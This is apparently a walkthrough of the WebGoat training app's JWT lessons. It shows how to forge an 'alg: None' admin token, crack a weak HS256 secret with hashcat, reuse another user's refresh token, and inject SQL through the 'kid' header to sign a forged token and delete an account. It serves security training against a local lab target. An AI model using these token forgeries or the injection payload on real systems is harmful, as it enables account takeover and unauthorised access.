# (A2) JWT tokens

## Lesson 4 - JWT signing
Login as Tom and grab the JWT token from `Set-Cookie` response header:
```
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1ODYxNjAzNTUsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.dsugXZYLM8WnyzWAA-CFOXCAzfVn0DwzrlmeY6Bns-Uce9Ez3IMq4SSLbk1YgQWNeg7kchjL9wUIqo6nVg8Sfg
```

We can easily decode the token on https://jwt.io/ (or manually on [Base64URL](http://www.base64url.com/)):
```
Header:
{
  "alg": "HS512"
}

Payload:
{
  "iat": 1586160355,
  "admin": "false",
  "user": "Tom"
}

Signature:
dsugXZYLM8WnyzWAA-CFOXCAzfVn0DwzrlmeY6Bns-Uce9Ez3IMq4SSLbk1YgQWNeg7kchjL9wUIqo6nVg8Sfg
```

Let's make a few changes (`alg` to `None` and `admin` to `true`):
```
Header:
{
  "alg": "None"
}

Payload:
{
  "iat": 1586160355,
  "admin": "true",
  "user": "Tom"
}
``` 

Encode it again with [Base64URL](http://www.base64url.com/), omit the signature completely and use this token
to reset the votes:
```
eyAiYWxnIjogIk5vbmUiIH0.eyAgImlhdCI6IDE1ODYxNjAzNTUsICAiYWRtaW4iOiAidHJ1ZSIsICAidXNlciI6ICJUb20ifQ.
```

## Lesson 5 - JWT cracking
The goal is to crack the given (randomly generated) JWT token:
```
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTU4NTA4MzgyOCwiZXhwIjoxNTg1MDgzODg4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.fqAAKhCRC__ZeBKZJkR8zDMmfDJLCYd4YJMrrbVXiJc
```

The token is signed with `HS256` but the password is weak. I chose [hashcat](https://hashcat.net/hashcat/)
which has a built-in support for cracking JWT tokens:
```
$ hashcat -a 0 -m 16500 data/02-broken-auth/jwt-token.txt data/02-broken-auth/google-10000-english.txt
..
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTU4NTA4MzgyOCwiZXhwIjoxNTg1MDgzODg4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.fqAAKhCRC__ZeBKZJkR8zDMmfDJLCYd4YJMrrbVXiJc:business
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: JWT (JSON Web Token)
Hash.Target......: eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIE...bVXiJc
Time.Started.....: Fri Mar 27 04:03:58 2020 (1 sec)
Time.Estimated...: Fri Mar 27 04:03:59 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    25384 H/s (8.64ms) @ Accel:384 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 4608/14344385 (0.03%)
Rejected.........: 0/4608 (0.00%)
Restore.Point....: 3072/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: adriano -> class08
```
- `-a 0` is for dictionary attack
- `-m 16500` is for JWT token (you can find in help)

The password is `business`. Knowing the password, we can easily modify the and re-sign the token on https://jwt.io/.

Note: _hashcat_ was unable to crack some of the tokens failing on `Token length exception`. This is perhaps
a bug in `hashcat 5.1.0`? I had to try more tokens before succeeding. More people are having the same issue.

## Lesson 7 - Refreshing a token
Grab Tom's expired access token from the attached logfile:
```
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "GET /JWT/refresh/checkout?token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q HTTP/1.1" 401 242 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
```

Then grab yours (Jerry's) refresh token from this request:
```
POST http://localhost:8080/WebGoat/JWT/refresh/login
{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}

---
{
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0.Z-ZX2L0Tuub0LEyj9NmyVADu7tK40gL9h1EJeRg1DDa6z5_H-SrexH1MYHoIxRyApnOP7NfFonP3rOw1Y5qi0A",
  "refresh_token" : "KmEsYjlyyXXZXMzJtgYK"
}
```

Now you can obtain a new access token for Tom using Tom's expired access token and __your__ refresh token:
```
POST http://localhost:8080/WebGoat/JWT/refresh/newToken
Content-Type: application/json; charset=UTF-8
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q

{"refresh_token": "KmEsYjlyyXXZXMzJtgYK"}

---
{
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IlRvbSJ9.a4yUoDOuv6L7ICs-HsE6craLHG_u6YDTkmXiGHjF7GdJZVZWCTurWBBunW9ujab8f4vNG31XAEvWYUEmAt0SGg",
  "refresh_token" : "EQjLJaClKoYgwVRKczxT"
}
```
_I had to look into source code to find the `JWT/refresh/newToken` endpoint._

Finally, use the obtained access token for checkout:
```
POST http://vernjan:8080/WebGoat/JWT/refresh/checkout
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IlRvbSJ9.a4yUoDOuv6L7ICs-HsE6craLHG_u6YDTkmXiGHjF7GdJZVZWCTurWBBunW9ujab8f4vNG31XAEvWYUEmAt0SGg

---
{
  "lessonCompleted" : true,
  "feedback" : "Congratulations. You have successfully completed the assignment.",
  "output" : null,
  "assignment" : "JWTRefreshEndpoint",
  "attemptWasMade" : true
}
```

## Lesson 8 - Final challenges
Let's start with decoding Jerry's JWT:
```
Header:
{
  "typ": "JWT",
  "kid": "webgoat_key",
  "alg": "HS256"
}

Payload:
{
  "iss": "WebGoat Token Builder",
  "iat": 1524210904,
  "exp": 1618905304,
  "aud": "webgoat.org",
  "sub": "jerry@webgoat.com",
  "username": "Jerry",
  "Email": "jerry@webgoat.com",
  "Role": [
    "Cat"
  ]
}
```

We know the `kid` (key ID). See https://stackoverflow.com/questions/43867440/whats-the-meaning-of-the-kid-claim-in-a-jwt-token

Hint is to try SQL injection. We can try to change the key ID to, for example, `mykey`.
Use https://jwt.io to easily manipulate the JWT:
```
Header:
{
  "typ": "JWT",
  "kid": "webgoat_key' UNION SELECT 'bXlrZXk=' FROM SALARIES -- ",
  "alg": "HS256"
}
```
- `bXlrZXk=` is `mykey` encoded in Base64
- `SALARIES` is just a random table we know that exists (to make the SQL query valid)

```
Payload:
{
  "iss": "WebGoat Token Builder",
  "iat": 1524210904,
  "exp": 1618905304,
  "aud": "webgoat.org",
  "sub": "jerry@webgoat.com",
  "username": "Tom",
  "Email": "jerry@webgoat.com",
  "Role": [
    "Cat"
  ]
}
```
- Change username to `Tom`

And finally, sign with `mykey`:
```
eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleScgVU5JT04gU0VMRUNUICdiWGxyWlhrPScgRlJPTSBTQUxBUklFUyAtLSAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.cFOOglRj7lBOlZbWRctZF3LOPyt1Zx_xiVawv4KM5Xw
```

You can use this JWT to delete Tom's account.